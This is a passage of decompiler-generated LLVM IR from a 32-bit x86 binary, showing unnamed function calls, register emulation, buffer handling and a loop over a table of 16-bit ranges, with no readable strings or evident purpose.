  %v8_804eba8 = icmp eq i32 %v0_804eba0, -1
  %v1_804eba9 = icmp eq i1 %v8_804eba8, false
  %v2_804eba9 = zext i1 %v1_804eba9 to i32
  %v2_804ebac = icmp eq i1 %v1_804eba9, false
  store i32 %v2_804eba9, i32* %eax.global-to-local, align 4
  store i32 %v2_804eba9, i32* @esi, align 4
  br i1 %v2_804ebac, label %dec_label_pc_804eeb2, label %dec_label_pc_804ebbb

dec_label_pc_804ebbb:                             ; preds = %dec_label_pc_804eb8d, %dec_label_pc_804eb27
  %v0_804ebbb = phi i32 [ %v1_804eba5, %dec_label_pc_804eb8d ], [ %v1_804eb7b, %dec_label_pc_804eb27 ]
  %v1_804ebbe = add i32 %v0_804ebbb, -16
  %v2_804ebbe = inttoptr i32 %v1_804ebbe to i32*
  store i32 29, i32* %v2_804ebbe, align 4
  %v0_804ebc0 = call i32 @function_804f0e0()
  store i32 %v0_804ebc0, i32* %eax.global-to-local, align 4
  %v0_804ebc5 = load i32, i32* @esp, align 4
  %v1_804ebc5 = inttoptr i32 %v0_804ebc5 to i32*
  store i32 30, i32* %v1_804ebc5, align 4
  %v0_804ebcc = call i32 @function_804f0e0()
  store i32 %v0_804ebcc, i32* %eax.global-to-local, align 4
  %v0_804ebd4 = load i32, i32* @esi, align 4
  %v10_804ebd4 = icmp eq i32 %v0_804ebd4, -1
  br i1 %v10_804ebd4, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ebdd

dec_label_pc_804ebdd:                             ; preds = %dec_label_pc_804ebbb, %dec_label_pc_804ec22
  %v0_804ebdd = phi i32 [ %v0_804ebd4, %dec_label_pc_804ebbb ], [ %v0_804ebdd.pre, %dec_label_pc_804ec22 ]
  %v0_804ebe9.in = load i32, i32* @esp, align 4
  %tmp142 = icmp slt i32 %v0_804ebdd, 1
  br i1 %tmp142, label %dec_label_pc_804ea99, label %dec_label_pc_804ebe5

dec_label_pc_804ebe5:                             ; preds = %dec_label_pc_804ebdd
  %v0_804ebe5 = load i32, i32* @edi, align 4
  %v1_804ebe5 = inttoptr i32 %v0_804ebe5 to i32*
  %v2_804ebe5 = load i32, i32* %v1_804ebe5, align 4
  store i32 %v2_804ebe5, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ebe9 = add i32 %v0_804ebe9.in, 12
  %v2_804ebe9 = inttoptr i32 %v1_804ebe9 to i32*
  store i32 16384, i32* %v2_804ebe9, align 4
  %v0_804ebee = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebee = add i32 %v0_804ebee, 12
  %v2_804ebee = inttoptr i32 %v1_804ebee to i8*
  %v3_804ebee = load i8, i8* %v2_804ebee, align 1
  %v4_804ebee = zext i8 %v3_804ebee to i32
  %v5_804ebee = load i32, i32* %eax.global-to-local, align 4
  %v6_804ebee = and i32 %v5_804ebee, -256
  %v7_804ebee = or i32 %v6_804ebee, %v4_804ebee
  store i32 %v7_804ebee, i32* %eax.global-to-local, align 4
  %v2_804ebf1 = add i32 %v0_804ebe9.in, 8
  %v3_804ebf1 = inttoptr i32 %v2_804ebf1 to i32*
  store i32 %v7_804ebee, i32* %v3_804ebf1, align 4
  %v0_804ebf2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebf2 = inttoptr i32 %v0_804ebf2 to i32*
  %v2_804ebf2 = load i32, i32* %v1_804ebf2, align 4
  %v2_804ebf4 = add i32 %v0_804ebe9.in, 4
  %v3_804ebf4 = inttoptr i32 %v2_804ebf4 to i32*
  store i32 %v2_804ebf2, i32* %v3_804ebf4, align 4
  %v0_804ebf5 = load i32, i32* @edi, align 4
  %v1_804ebf5 = add i32 %v0_804ebf5, 4
  %v2_804ebf5 = inttoptr i32 %v1_804ebf5 to i32*
  %v3_804ebf5 = load i32, i32* %v2_804ebf5, align 4
  store i32 %v3_804ebf5, i32* @ebx, align 4
  %v3_804ebf8 = inttoptr i32 %v0_804ebe9.in to i32*
  store i32 %v3_804ebf5, i32* %v3_804ebf8, align 4
  %v0_804ebf9 = call i32 @function_8050441()
  store i32 %v0_804ebf9, i32* %eax.global-to-local, align 4
  %v0_804ebfe = load i32, i32* @esp, align 4
  %v1_804ebfe = add i32 %v0_804ebfe, -4
  %v2_804ebfe = inttoptr i32 %v1_804ebfe to i32*
  store i32 16384, i32* %v2_804ebfe, align 4
  %v1_804ec03 = add i32 %v0_804ebfe, -8
  %v2_804ec03 = inttoptr i32 %v1_804ec03 to i32*
  store i32 2, i32* %v2_804ec03, align 4
  %v1_804ec05 = add i32 %v0_804ebfe, -12
  %v2_804ec05 = inttoptr i32 %v1_804ec05 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804ec05, align 4
  %v0_804ec0a = load i32, i32* @edi, align 4
  %v1_804ec0a = add i32 %v0_804ec0a, 4
  %v2_804ec0a = inttoptr i32 %v1_804ec0a to i32*
  %v3_804ec0a = load i32, i32* %v2_804ec0a, align 4
  store i32 %v3_804ec0a, i32* %ecx.global-to-local, align 4
  %v2_804ec0d = add i32 %v0_804ebfe, -16
  %v3_804ec0d = inttoptr i32 %v2_804ec0d to i32*
  store i32 %v3_804ec0a, i32* %v3_804ec0d, align 4
  %v0_804ec0e = call i32 @function_8050441()
  store i32 %v0_804ec0e, i32* %eax.global-to-local, align 4
  %v0_804ec16 = load i32, i32* @edi, align 4
  %v1_804ec16 = add i32 %v0_804ec16, 12
  %v2_804ec16 = inttoptr i32 %v1_804ec16 to i32*
  store i32 4, i32* %v2_804ec16, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804ec22:                             ; preds = %dec_label_pc_804eb1b
  %v0_804ec22 = load i32, i32* @esp, align 4
  %v1_804ec25 = add i32 %v0_804ec22, -16
  %v2_804ec25 = inttoptr i32 %v1_804ec25 to i32*
  store i32 29, i32* %v2_804ec25, align 4
  %v0_804ec27 = call i32 @function_804f0e0()
  store i32 %v0_804ec27, i32* %eax.global-to-local, align 4
  %v0_804ec2c = load i32, i32* @esp, align 4
  %v1_804ec2c = inttoptr i32 %v0_804ec2c to i32*
  store i32 30, i32* %v1_804ec2c, align 4
  %v0_804ec33 = call i32 @function_804f0e0()
  store i32 %v0_804ec33, i32* %eax.global-to-local, align 4
  %v0_804ebdd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ebdd

dec_label_pc_804ec3d:                             ; preds = %dec_label_pc_804e707
  store i32 11, i32* %v1_804ec47, align 4
  %v0_804ec4e = call i32 @function_804f160()
  store i32 %v0_804ec4e, i32* %eax.global-to-local, align 4
  %v0_804ec53 = load i32, i32* @esp, align 4
  %v1_804ec53 = inttoptr i32 %v0_804ec53 to i32*
  %v3_804ec53 = add i32 %v0_804ec53, 4
  %v1_804ec54 = inttoptr i32 %v3_804ec53 to i32*
  %v1_804ec55 = add i32 %v0_804ec53, 1864
  store i32 %v1_804ec55, i32* %eax.global-to-local, align 4
  store i32 %v1_804ec55, i32* %v1_804ec54, align 4
  store i32 11, i32* %v1_804ec53, align 4
  %v0_804ec5f = call i32 @function_804f0b0()
  store i32 %v0_804ec5f, i32* %eax.global-to-local, align 4
  %v0_804ec64 = load i32, i32* @esp, align 4
  %v1_804ec64 = add i32 %v0_804ec64, 1864
  %v2_804ec64 = inttoptr i32 %v1_804ec64 to i32*
  %v3_804ec64 = load i32, i32* %v2_804ec64, align 4
  %v1_804ec6b = add i32 %v3_804ec64, -1
  store i32 %v1_804ec6b, i32* %edx.global-to-local, align 4
  %v2_804ec6c = add i32 %v0_804ec64, -4
  %v3_804ec6c = inttoptr i32 %v2_804ec6c to i32*
  store i32 %v1_804ec6b, i32* %v3_804ec6c, align 4
  %v2_804ec6d = add i32 %v0_804ec64, -8
  %v3_804ec6d = inttoptr i32 %v2_804ec6d to i32*
  store i32 %v0_804ec5f, i32* %v3_804ec6d, align 4
  %v0_804ec6e = load i32, i32* @edi, align 4
  %v1_804ec6e = add i32 %v0_804ec6e, 24
  %v2_804ec6e = inttoptr i32 %v1_804ec6e to i32*
  %v3_804ec6e = load i32, i32* %v2_804ec6e, align 4
  %v2_804ec71 = add i32 %v0_804ec64, -12
  %v3_804ec71 = inttoptr i32 %v2_804ec71 to i32*
  store i32 %v3_804ec6e, i32* %v3_804ec71, align 4
  %v1_804ec72 = add i32 %v0_804ec64, 24
  %v2_804ec72 = inttoptr i32 %v1_804ec72 to i32*
  %v3_804ec72 = load i32, i32* %v2_804ec72, align 4
  store i32 %v3_804ec72, i32* @ebx, align 4
  %v2_804ec76 = add i32 %v0_804ec64, -16
  %v3_804ec76 = inttoptr i32 %v2_804ec76 to i32*
  store i32 %v3_804ec72, i32* %v3_804ec76, align 4
  %v0_804ec77 = call i32 @function_804f870()
  store i32 %v0_804ec77, i32* %eax.global-to-local, align 4
  %v0_804ec7c = load i32, i32* @esp, align 4
  store i32 %v0_804ec77, i32* @esi, align 4
  %v1_804ec81 = add i32 %v0_804ec7c, 16
  %v2_804ec81 = inttoptr i32 %v1_804ec81 to i32*
  store i32 11, i32* %v2_804ec81, align 4
  %v0_804ec83 = call i32 @function_804f0e0()
  store i32 %v0_804ec83, i32* %eax.global-to-local, align 4
  %v0_804ec88 = load i32, i32* @esp, align 4
  %v0_804ec8b = load i32, i32* @esi, align 4
  %v10_804ec8b = icmp eq i32 %v0_804ec8b, -1
  br i1 %v10_804ec8b, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ec94

dec_label_pc_804ec94:                             ; preds = %dec_label_pc_804ec3d
  %tmp143 = icmp slt i32 %v0_804ec8b, 1
  br i1 %tmp143, label %dec_label_pc_804ea99, label %dec_label_pc_804ec9c

dec_label_pc_804ec9c:                             ; preds = %dec_label_pc_804ec94
  %v0_804ec9c = load i32, i32* @edi, align 4
  %v1_804ec9c = add i32 %v0_804ec9c, 20
  %v2_804ec9c = inttoptr i32 %v1_804ec9c to i32*
  %v3_804ec9c = load i32, i32* %v2_804ec9c, align 4
  store i32 %v3_804ec9c, i32* %edx.global-to-local, align 4
  %v1_804ec9f = add i32 %v0_804ec9c, 16
  %v2_804ec9f = inttoptr i32 %v1_804ec9f to i32*
  %v3_804ec9f = load i32, i32* %v2_804ec9f, align 4
  store i32 %v3_804ec9f, i32* %eax.global-to-local, align 4
  %v1_804eca2 = inttoptr i32 %v0_804ec9c to i32*
  %v2_804eca2 = load i32, i32* %v1_804eca2, align 4
  store i32 %v2_804eca2, i32* @ebp, align 4
  %v2_804eca4 = add i32 %v0_804ec88, 1872
  %v3_804eca4 = inttoptr i32 %v2_804eca4 to i32*
  store i32 %v3_804ec9f, i32* %v3_804eca4, align 4
  %v0_804ecab = load i32, i32* %edx.global-to-local, align 4
  %v1_804ecab = trunc i32 %v0_804ecab to i16
  %v2_804ecab = load i32, i32* @esp, align 4
  %v3_804ecab = add i32 %v2_804ecab, 1866
  %v4_804ecab = inttoptr i32 %v3_804ecab to i16*
  store i16 %v1_804ecab, i16* %v4_804ecab, align 2
  %v0_804ecb3 = call i32 @function_804fd11()
  store i32 %v0_804ecb3, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_804ecb3, 1
  br i1 %tmp144, label %dec_label_pc_804eed0, label %dec_label_pc_804ecc0

dec_label_pc_804ecc0:                             ; preds = %dec_label_pc_804eed0, %dec_label_pc_804ec9c
  %v0_804ecc0 = load i32, i32* @esp, align 4
  %v0_804ecc3 = load i32, i32* @edi, align 4
  %v1_804ecc3 = add i32 %v0_804ecc3, 4
  %v2_804ecc3 = inttoptr i32 %v1_804ecc3 to i32*
  %v3_804ecc3 = load i32, i32* %v2_804ecc3, align 4
  %v2_804ecc6 = add i32 %v0_804ecc0, -16
  %v3_804ecc6 = inttoptr i32 %v2_804ecc6 to i32*
  store i32 %v3_804ecc3, i32* %v3_804ecc6, align 4
  %v1_804ecc7 = call i32 @function_804fce3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ecc7, i32* %eax.global-to-local, align 4
  %v0_804eccf = load i32, i32* @edi, align 4
  %v1_804eccf = add i32 %v0_804eccf, 4
  %v2_804eccf = inttoptr i32 %v1_804eccf to i32*
  store i32 -1, i32* %v2_804eccf, align 4
  %v0_804ecd6 = load i32, i32* @edi, align 4
  %v1_804ecd6 = add i32 %v0_804ecd6, 12
  %v2_804ecd6 = inttoptr i32 %v1_804ecd6 to i32*
  store i32 0, i32* %v2_804ecd6, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804ece2:                             ; preds = %dec_label_pc_804e9ec
  %v0_804ece2 = load i32, i32* @esp, align 4
  %v1_804ece5 = add i32 %v0_804ece2, -16
  %v2_804ece5 = inttoptr i32 %v1_804ece5 to i32*
  store i32 28, i32* %v2_804ece5, align 4
  %v0_804ece7 = call i32 @function_804f0e0()
  store i32 %v0_804ece7, i32* %eax.global-to-local, align 4
  %v0_804ea57.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea57

dec_label_pc_804ecf4:                             ; preds = %dec_label_pc_804e5cc, %dec_label_pc_804e5cc, %dec_label_pc_804e5cc, %dec_label_pc_804e5cc, %dec_label_pc_804e5cc
  %v1_804ecf4 = add i32 %v0_804ecf4, 1
  store i32 %v1_804ecf4, i32* @esi, align 4
  %v10_804ecf7 = icmp eq i32 %v0_804ecf4, -2
  br i1 %v10_804ecf7, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ed00

dec_label_pc_804ed00:                             ; preds = %dec_label_pc_804ecf4
  %tmp145 = icmp slt i32 %v1_804ecf4, 1
  br i1 %tmp145, label %dec_label_pc_804ea99, label %dec_label_pc_804ed08

dec_label_pc_804ed08:                             ; preds = %dec_label_pc_804ed00
  %v0_804ed08 = load i32, i32* @esp, align 4
  %v1_804ed0b = add i32 %v0_804ed08, -16
  %v2_804ed0b = inttoptr i32 %v1_804ed0b to i32*
  store i32 7, i32* %v2_804ed0b, align 4
  %v0_804ed0d = call i32 @function_804f160()
  store i32 %v0_804ed0d, i32* %eax.global-to-local, align 4
  %v0_804ed12 = load i32, i32* @esp, align 4
  %v1_804ed12 = inttoptr i32 %v0_804ed12 to i32*
  %v2_804ed12 = load i32, i32* %v1_804ed12, align 4
  store i32 %v2_804ed12, i32* %eax.global-to-local, align 4
  %v3_804ed12 = add i32 %v0_804ed12, 4
  %v1_804ed13 = inttoptr i32 %v3_804ed12 to i32*
  %v2_804ed13 = load i32, i32* %v1_804ed13, align 4
  store i32 %v2_804ed13, i32* %edx.global-to-local, align 4
  %v1_804ed14 = add i32 %v0_804ed12, 1864
  store i32 %v1_804ed14, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ed14, i32* %v1_804ed13, align 4
  store i32 7, i32* %v1_804ed12, align 4
  %v0_804ed1e = call i32 @function_804f0b0()
  store i32 %v0_804ed1e, i32* %eax.global-to-local, align 4
  %v0_804ed23 = load i32, i32* @esp, align 4
  %v1_804ed23 = add i32 %v0_804ed23, -4
  %v2_804ed23 = inttoptr i32 %v1_804ed23 to i32*
  store i32 16384, i32* %v2_804ed23, align 4
  %v1_804ed28 = add i32 %v0_804ed23, 1864
  %v2_804ed28 = inttoptr i32 %v1_804ed28 to i32*
  %v3_804ed28 = load i32, i32* %v2_804ed28, align 4
  %v2_804ed2f = add i32 %v0_804ed23, -8
  %v3_804ed2f = inttoptr i32 %v2_804ed2f to i32*
  store i32 %v3_804ed28, i32* %v3_804ed2f, align 4
  %v2_804ed30 = add i32 %v0_804ed23, -12
  %v3_804ed30 = inttoptr i32 %v2_804ed30 to i32*
  store i32 %v0_804ed1e, i32* %v3_804ed30, align 4
  %v0_804ed31 = load i32, i32* @edi, align 4
  %v1_804ed31 = add i32 %v0_804ed31, 4
  %v2_804ed31 = inttoptr i32 %v1_804ed31 to i32*
  %v3_804ed31 = load i32, i32* %v2_804ed31, align 4
  store i32 %v3_804ed31, i32* @ebx, align 4
  %v2_804ed34 = add i32 %v0_804ed23, -16
  %v3_804ed34 = inttoptr i32 %v2_804ed34 to i32*
  store i32 %v3_804ed31, i32* %v3_804ed34, align 4
  %v0_804ed35 = call i32 @function_8050441()
  store i32 %v0_804ed35, i32* %eax.global-to-local, align 4
  %v0_804ed3a = load i32, i32* @esp, align 4
  %v1_804ed3d = add i32 %v0_804ed3a, 28
  %v2_804ed3d = inttoptr i32 %v1_804ed3d to i32*
  store i32 16384, i32* %v2_804ed3d, align 4
  %v1_804ed42 = add i32 %v0_804ed3a, 24
  %v2_804ed42 = inttoptr i32 %v1_804ed42 to i32*
  store i32 2, i32* %v2_804ed42, align 4
  %v1_804ed44 = add i32 %v0_804ed3a, 20
  %v2_804ed44 = inttoptr i32 %v1_804ed44 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804ed44, align 4
  %v0_804ed49 = load i32, i32* @edi, align 4
  %v1_804ed49 = add i32 %v0_804ed49, 4
  %v2_804ed49 = inttoptr i32 %v1_804ed49 to i32*
  %v3_804ed49 = load i32, i32* %v2_804ed49, align 4
  store i32 %v3_804ed49, i32* %ecx.global-to-local, align 4
  %v2_804ed4c = add i32 %v0_804ed3a, 16
  %v3_804ed4c = inttoptr i32 %v2_804ed4c to i32*
  store i32 %v3_804ed49, i32* %v3_804ed4c, align 4
  %v0_804ed4d = call i32 @function_8050441()
  store i32 %v0_804ed4d, i32* %eax.global-to-local, align 4
  %v0_804ed52 = load i32, i32* @esp, align 4
  %v1_804ed52 = inttoptr i32 %v0_804ed52 to i32*
  store i32 7, i32* %v1_804ed52, align 4
  %v0_804ed59 = call i32 @function_804f0e0()
  store i32 %v0_804ed59, i32* %eax.global-to-local, align 4
  %v0_804ed61 = load i32, i32* @edi, align 4
  %v1_804ed61 = add i32 %v0_804ed61, 12
  %v2_804ed61 = inttoptr i32 %v1_804ed61 to i32*
  store i32 6, i32* %v2_804ed61, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804ed6d:                             ; preds = %dec_label_pc_804e7bf, %dec_label_pc_804e7bf, %dec_label_pc_804e7bf, %dec_label_pc_804e7bf, %dec_label_pc_804e7bf
  %v1_804ed6d = add i32 %v0_804ed6d, 1
  store i32 %v1_804ed6d, i32* @esi, align 4
  %v10_804ed70 = icmp eq i32 %v0_804ed6d, -2
  br i1 %v10_804ed70, label %dec_label_pc_804e425.backedge, label %dec_label_pc_804ed79

dec_label_pc_804ed79:                             ; preds = %dec_label_pc_804ed6d
  %tmp146 = icmp slt i32 %v1_804ed6d, 1
  br i1 %tmp146, label %dec_label_pc_804ea99, label %dec_label_pc_804ed81

dec_label_pc_804ed81:                             ; preds = %dec_label_pc_804ed79
  %v0_804ed81 = load i32, i32* @esp, align 4
  %v1_804ed84 = add i32 %v0_804ed81, -16
  %v2_804ed84 = inttoptr i32 %v1_804ed84 to i32*
  store i32 6, i32* %v2_804ed84, align 4
  %v0_804ed86 = call i32 @function_804f160()
  store i32 %v0_804ed86, i32* %eax.global-to-local, align 4
  %v0_804ed8b = load i32, i32* @esp, align 4
  %v1_804ed8b = inttoptr i32 %v0_804ed8b to i32*
  %v2_804ed8b = load i32, i32* %v1_804ed8b, align 4
  store i32 %v2_804ed8b, i32* %eax.global-to-local, align 4
  %v3_804ed8b = add i32 %v0_804ed8b, 4
  %v1_804ed8c = inttoptr i32 %v3_804ed8b to i32*
  %v2_804ed8c = load i32, i32* %v1_804ed8c, align 4
  store i32 %v2_804ed8c, i32* %edx.global-to-local, align 4
  %v1_804ed8d = add i32 %v0_804ed8b, 1872
  store i32 %v1_804ed8d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed8d, i32* %v1_804ed8c, align 4
  store i32 6, i32* %v1_804ed8b, align 4
  %v0_804ed97 = call i32 @function_804f0b0()
  store i32 %v0_804ed97, i32* %eax.global-to-local, align 4
  %v0_804ed9c = load i32, i32* @esp, align 4
  %v1_804ed9c = add i32 %v0_804ed9c, -4
  %v2_804ed9c = inttoptr i32 %v1_804ed9c to i32*
  store i32 16384, i32* %v2_804ed9c, align 4
  %v1_804eda1 = add i32 %v0_804ed9c, 1872
  %v2_804eda1 = inttoptr i32 %v1_804eda1 to i32*
  %v3_804eda1 = load i32, i32* %v2_804eda1, align 4
  %v2_804eda8 = add i32 %v0_804ed9c, -8
  %v3_804eda8 = inttoptr i32 %v2_804eda8 to i32*
  store i32 %v3_804eda1, i32* %v3_804eda8, align 4
  %v2_804eda9 = add i32 %v0_804ed9c, -12
  %v3_804eda9 = inttoptr i32 %v2_804eda9 to i32*
  store i32 %v0_804ed97, i32* %v3_804eda9, align 4
  %v0_804edaa = load i32, i32* @edi, align 4
  %v1_804edaa = add i32 %v0_804edaa, 4
  %v2_804edaa = inttoptr i32 %v1_804edaa to i32*
  %v3_804edaa = load i32, i32* %v2_804edaa, align 4
  store i32 %v3_804edaa, i32* @ebx, align 4
  %v2_804edad = add i32 %v0_804ed9c, -16
  %v3_804edad = inttoptr i32 %v2_804edad to i32*
  store i32 %v3_804edaa, i32* %v3_804edad, align 4
  %v0_804edae = call i32 @function_8050441()
  store i32 %v0_804edae, i32* %eax.global-to-local, align 4
  %v0_804edb3 = load i32, i32* @esp, align 4
  %v1_804edb6 = add i32 %v0_804edb3, 28
  %v2_804edb6 = inttoptr i32 %v1_804edb6 to i32*
  store i32 16384, i32* %v2_804edb6, align 4
  %v1_804edbb = add i32 %v0_804edb3, 24
  %v2_804edbb = inttoptr i32 %v1_804edbb to i32*
  store i32 2, i32* %v2_804edbb, align 4
  %v1_804edbd = add i32 %v0_804edb3, 20
  %v2_804edbd = inttoptr i32 %v1_804edbd to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052659.22 to i32), i32* %v2_804edbd, align 4
  %v0_804edc2 = load i32, i32* @edi, align 4
  %v1_804edc2 = add i32 %v0_804edc2, 4
  %v2_804edc2 = inttoptr i32 %v1_804edc2 to i32*
  %v3_804edc2 = load i32, i32* %v2_804edc2, align 4
  store i32 %v3_804edc2, i32* %ecx.global-to-local, align 4
  %v2_804edc5 = add i32 %v0_804edb3, 16
  %v3_804edc5 = inttoptr i32 %v2_804edc5 to i32*
  store i32 %v3_804edc2, i32* %v3_804edc5, align 4
  %v0_804edc6 = call i32 @function_8050441()
  store i32 %v0_804edc6, i32* %eax.global-to-local, align 4
  %v0_804edcb = load i32, i32* @esp, align 4
  %v1_804edcb = inttoptr i32 %v0_804edcb to i32*
  store i32 6, i32* %v1_804edcb, align 4
  %v0_804edd2 = call i32 @function_804f0e0()
  store i32 %v0_804edd2, i32* %eax.global-to-local, align 4
  %v0_804edda = load i32, i32* @edi, align 4
  %v1_804edda = add i32 %v0_804edda, 12
  %v2_804edda = inttoptr i32 %v1_804edda to i32*
  store i32 8, i32* %v2_804edda, align 4
  br label %dec_label_pc_804e788

dec_label_pc_804ede6:                             ; preds = %dec_label_pc_804e3f1
  %v1_804ede6 = add i32 %v0_804e3fb, 1856
  %v2_804ede6 = inttoptr i32 %v1_804ede6 to i32*
  store i32 0, i32* %v2_804ede6, align 4
  %v0_804edf1 = load i32, i32* @esp, align 4
  %v1_804edf1 = add i32 %v0_804edf1, 1848
  %v2_804edf1 = inttoptr i32 %v1_804edf1 to i32*
  store i32 4, i32* %v2_804edf1, align 4
  %v0_804edfc = load i32, i32* @esp, align 4
  %v1_804edff = add i32 %v0_804edfc, 1848
  %v2_804ee06 = add i32 %v0_804edfc, -16
  %v3_804ee06 = inttoptr i32 %v2_804ee06 to i32*
  store i32 %v1_804edff, i32* %v3_804ee06, align 4
  %v1_804ee07 = add i32 %v0_804edfc, 1856
  store i32 %v1_804ee07, i32* %eax.global-to-local, align 4
  %v2_804ee0e = add i32 %v0_804edfc, -20
  %v3_804ee0e = inttoptr i32 %v2_804ee0e to i32*
  store i32 %v1_804ee07, i32* %v3_804ee0e, align 4
  %v1_804ee0f = add i32 %v0_804edfc, -24
  %v2_804ee0f = inttoptr i32 %v1_804ee0f to i32*
  store i32 4, i32* %v2_804ee0f, align 4
  %v1_804ee11 = add i32 %v0_804edfc, -28
  %v2_804ee11 = inttoptr i32 %v1_804ee11 to i32*
  store i32 1, i32* %v2_804ee11, align 4
  %v0_804ee13 = load i32, i32* @edi, align 4
  %v1_804ee13 = add i32 %v0_804ee13, 4
  %v2_804ee13 = inttoptr i32 %v1_804ee13 to i32*
  %v3_804ee13 = load i32, i32* %v2_804ee13, align 4
  store i32 %v3_804ee13, i32* %eax.global-to-local, align 4
  %v2_804ee16 = add i32 %v0_804edfc, -32
  %v3_804ee16 = inttoptr i32 %v2_804ee16 to i32*
  store i32 %v3_804ee13, i32* %v3_804ee16, align 4
  %v0_804ee17 = call i32 @function_805036d()
  store i32 %v0_804ee17, i32* %eax.global-to-local, align 4
  %v0_804ee1c = load i32, i32* @esp, align 4
  %v2_804ee1f = add i32 %v0_804ee1c, 1888
  %v3_804ee1f = inttoptr i32 %v2_804ee1f to i32*
  %v4_804ee1f = load i32, i32* %v3_804ee1f, align 4
  %v5_804ee1f = or i32 %v4_804ee1f, %v0_804ee17
  %v6_804ee1f = icmp eq i32 %v5_804ee1f, 0
  store i32 %v5_804ee1f, i32* %eax.global-to-local, align 4
  %v1_804ee26 = icmp eq i1 %v6_804ee1f, false
  br i1 %v1_804ee26, label %dec_label_pc_804ee89, label %dec_label_pc_804ee28

dec_label_pc_804ee28:                             ; preds = %dec_label_pc_804ede6
  %v0_804ee28 = load i32, i32* @edi, align 4
  %v1_804ee28 = add i32 %v0_804ee28, 12
  %v2_804ee28 = inttoptr i32 %v1_804ee28 to i32*
  store i32 2, i32* %v2_804ee28, align 4
  %v0_804ee2f = call i32 @function_804d6c0()
  %v1_804ee2f = sext i32 %v0_804ee2f to i64
  %v0_804ee34 = load i16, i16* @global_var_805312c.23, align 4
  %v1_804ee34 = zext i16 %v0_804ee34 to i32
  %v0_804ee41 = load i32, i32* @global_var_80530e0.24, align 32
  store i32 %v0_804ee41, i32* @ebx, align 4
  store i32 %v1_804ee34, i32* %ecx.global-to-local, align 4
  %v8_804ee4b = zext i16 %v0_804ee34 to i64
  %v9_804ee4b = udiv i64 %v1_804ee2f, %v8_804ee4b
  %v10_804ee4b = trunc i64 %v9_804ee4b to i32
  store i32 %v10_804ee4b, i32* %eax.global-to-local, align 4
  %v11_804ee4b = urem i64 %v1_804ee2f, %v8_804ee4b
  %v12_804ee4b = trunc i64 %v11_804ee4b to i32
  store i32 %v12_804ee4b, i32* %edx.global-to-local, align 4
  %tmp147 = icmp slt i32 %v0_804ee41, 1
  br i1 %tmp147, label %dec_label_pc_804ee76, label %dec_label_pc_804ee51

dec_label_pc_804ee51:                             ; preds = %dec_label_pc_804ee28
  %v0_804ee51 = load i32, i32* @global_var_8053128.25, align 8
  store i32 %v0_804ee51, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804ee68 = trunc i64 %v11_804ee4b to i16
  br label %dec_label_pc_804ee68

dec_label_pc_804ee60:                             ; preds = %dec_label_pc_804ee6e, %dec_label_pc_804ee68
  %v1_804ee60 = add i32 %v0_804ee60, 1
  store i32 %v1_804ee60, i32* %ecx.global-to-local, align 4
  %v1_804ee61 = add i32 %v0_804ee61, 16
  store i32 %v1_804ee61, i32* %eax.global-to-local, align 4
  %v12_804ee64 = icmp eq i32 %v1_804ee60, %v0_804ee41
  br i1 %v12_804ee64, label %dec_label_pc_804ee76, label %dec_label_pc_804ee68

dec_label_pc_804ee68:                             ; preds = %dec_label_pc_804ee60, %dec_label_pc_804ee51
  %v0_804ee60 = phi i32 [ %v1_804ee60, %dec_label_pc_804ee60 ], [ 0, %dec_label_pc_804ee51 ]
  %v0_804ee61 = phi i32 [ %v1_804ee61, %dec_label_pc_804ee60 ], [ %v0_804ee51, %dec_label_pc_804ee51 ]
  %v3_804ee68 = add i32 %v0_804ee61, 8
  %v4_804ee68 = inttoptr i32 %v3_804ee68 to i16*
  %v5_804ee68 = load i16, i16* %v4_804ee68, align 2
  %v11_804ee68 = icmp ult i16 %v1_804ee68, %v5_804ee68
  br i1 %v11_804ee68, label %dec_label_pc_804ee60, label %dec_label_pc_804ee6e

dec_label_pc_804ee6e:                             ; preds = %dec_label_pc_804ee68
  %v3_804ee6e = add i32 %v0_804ee61, 10
  %v4_804ee6e = inttoptr i32 %v3_804ee6e to i16*
  %v5_804ee6e = load i16, i16* %v4_804ee6e, align 2
  %v11_804ee6e = icmp ult i16 %v1_804ee68, %v5_804ee6e
  %v1_804ee72 = icmp eq i1 %v11_804ee6e, false
  br i1 %v1_804ee72, label %dec_label_pc_804ee60, label %dec_label_pc_804ee78

dec_label_pc_804ee76:                             ; preds = %dec_label_pc_804ee60, %dec_label_pc_804ee28
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee78

dec_label_pc_804ee78:                             ; preds = %dec_label_pc_804ee6e, %dec_label_pc_804ee76
  %v0_804ee7b = phi i32 [ 0, %dec_label_pc_804ee76 ], [ %v0_804ee61, %dec_label_pc_804ee6e ]
  %v0_804ee78 = load i32, i32* @edi, align 4
  %v1_804ee78 = add i32 %v0_804ee78, 4
  %v2_804ee78 = inttoptr i32 %v1_804ee78 to i32*
  %v3_804ee78 = load i32, i32* %v2_804ee78, align 4
  store i32 %v3_804ee78, i32* %ecx.global-to-local, align 4
  %v2_804ee7b = inttoptr i32 %v0_804ee78 to i32*
  store i32 %v0_804ee7b, i32* %v2_804ee7b, align 4
  %v0_804ee7d = load i32, i32* @edi, align 4
  %v1_804ee7d = add i32 %v0_804ee7d, 24
  %v2_804ee7d = inttoptr i32 %v1_804ee7d to i32*
  store i32 0, i32* %v2_804ee7d, align 4
  %v0_804e40e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e416.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e40e

